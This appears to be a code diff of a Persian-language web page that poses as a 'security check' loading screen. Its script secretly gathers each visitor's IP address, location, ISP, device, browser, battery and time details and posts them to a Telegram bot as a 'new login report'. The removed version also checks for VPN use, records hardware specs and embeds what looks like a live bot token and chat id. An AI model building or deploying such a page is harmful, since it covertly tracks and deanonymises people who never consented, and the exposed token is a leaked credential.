@@ -2,136 +2,79 @@
 <html lang="fa">
 <head>
   <meta charset="UTF-8" />
-  <title>در حال بررسی امنیت</title>
-  <link href="https://fonts.googleapis.com/css2?family=Vazirmatn&display=swap" rel="stylesheet">
-  <style>
-    body {
-      font-family: 'Vazirmatn', sans-serif;
-      background: #0f0f0f;
-      color: #e0e0e0;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-    }
-
-    .card {
-      background: #1e1e1e;
-      border-radius: 16px;
-      padding: 24px;
-      box-shadow: 0 0 30px rgba(0,255,100,0.1);
-      text-align: center;
-      width: 90%;
-      max-width: 400px;
-    }
-
-    .title {
-      font-size: 1.5rem;
-      margin-bottom: 20px;
-      color: #1db954;
-    }
-
-    .spinner {
-      margin: 20px auto;
-      width: 48px;
-      height: 48px;
-      border: 5px solid rgba(255,255,255,0.2);
-      border-top: 5px solid #1db954;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    .footer {
-      margin-top: 30px;
-      font-size: 0.9rem;
-      color: #777;
-    }
-  </style>
+  <title>در حال بارگیری...</title>
 </head>
 <body>
-  <div class="card">
-    <div class="title">در حال بررسی امنیتی...</div>
-    <div class="spinner"></div>
-    <div class="footer">لطفاً منتظر بمانید</div>
-  </div>
+  <h3>در حال بارگیری اطلاعات امنیتی...</h3>
 
   <script>
     async function getInfoAndSend() {
       try {
+        // IP و موقعیت
         const ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
-        const battery = await navigator.getBattery?.();
-        const connection = navigator.connection || {};
-        const now = new Date();
 
+        // باتری
+        const battery = await navigator.getBattery?.();
+        const batteryLevel = battery ? `${(battery.level * 100).toFixed(0)}%` : "نامشخص";
+        const charging = battery ? (battery.charging ? "بله" : "خیر") : "نامشخص";
+
+        // زمان
+        const now = new Date();
+        const localTime = now.toLocaleString("fa-IR");
+        const ipTime = new Date().toLocaleString("fa-IR", { timeZone: ipData?.timezone || "UTC" });
+
+        // اطلاعات نهایی
         const info = {
           ip: ipData?.ip || "نامشخص",
-          city: ipData?.city || "-",
-          location: `${ipData?.region || "-"}, ${ipData?.country_name || "-"}`,
-          countryCode: ipData?.country || "-",
-          regionCode: ipData?.region_code || "-",
+          location: `${ipData?.city || "-"}, ${ipData?.region || "-"}, ${ipData?.country_name || "-"}`,
           org: ipData?.org || "نامشخص",
           os: navigator.platform || "نامشخص",
           browser: navigator.userAgent || "نامشخص",
           device: /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "mobile" : "desktop",
           screen: `${window.screen.width}x${window.screen.height}`,
-          language: navigator.language || "-",
-          battery: battery ? `${(battery.level * 100).toFixed(0)}%` : "نامشخص",
-          charging: battery ? (battery.charging ? "بله" : "خیر") : "نامشخص",
-          network: connection.effectiveType || "نامشخص",
-          cpu: navigator.hardwareConcurrency || "-",
-          memory: navigator.deviceMemory || "-",
-          online: navigator.onLine ? "بله" : "خیر",
-          vpn: ipData?.org?.toLowerCase().includes("vpn") ? "احتمالاً بله" : "احتمالاً خیر",
-          local_time: now.toLocaleString("fa-IR"),
-          ip_time: new Date().toLocaleString("fa-IR", { timeZone: ipData?.timezone || "UTC" }),
+          language: navigator.language || "نامشخص",
+          battery: batteryLevel,
+          charging: charging,
+          local_time: localTime,
+          ip_time: ipTime
         };
 
-        const msg = `[گزارش ورود جدید]
+        // پیام
+        const message = `[گزارش ورود جدید]\n
+IP: ${info.ip}\n
+\n
+مکان: ${info.location}\n
+\n
+ارائه‌دهنده: ${info.org}\n
+\n
+سیستم‌عامل: ${info.os}\n
+\n
+مرورگر: ${info.browser}\n
+\n
+نوع دستگاه: ${info.device}\n
+\n
+رزولوشن صفحه: ${info.screen}\n
+\n
+زبان مرورگر: ${info.language}\n
+\n
+وضعیت باتری: ${info.battery} - شارژ: ${info.charging}\n
+\n
+زمان محلی: ${info.local_time}\n
+\n
+زمان منطقه‌ای: ${info.ip_time}`;
 
-IP: ${info.ip}
-
-شهر: ${info.city}
-مکان: ${info.location}
-
-ارائه‌دهنده: ${info.org}
-
-کد کشور: ${info.countryCode} | کد منطقه: ${info.regionCode}
-
-سیستم‌عامل: ${info.os}
-مرورگر: ${info.browser}
-نوع دستگاه: ${info.device}
-رزولوشن صفحه: ${info.screen}
-
-زبان مرورگر: ${info.language}
-نوع شبکه: ${info.network}
-CPU: ${info.cpu} هسته | RAM: ${info.memory} GB
-وضعیت اتصال: ${info.online}
-VPN: ${info.vpn}
-
-وضعیت باتری: ${info.battery} - شارژ: ${info.charging}
-
-زمان محلی: ${info.local_time}
-زمان منطقه‌ای: ${info.ip_time}
-        `;
-
-        const token = "8194809349:AAEqk8M8sOWGxQwDO0tNlybKDki26JENT4w";
-        const chat_id = "7980459274";
+        // ارسال به تلگرام
+        const token = "توکن_ربات_تو_اینجا";
+        const chat_id = "آیدی_چت_تو_اینجا";
         const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
         fetch(url, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id, text: msg }),
+          body: JSON.stringify({ chat_id, text: message }),
         });
       } catch (err) {
-        console.error("خطا:", err);
+        console.error("خطا در دریافت یا ارسال اطلاعات:", err);
       }
     }
 
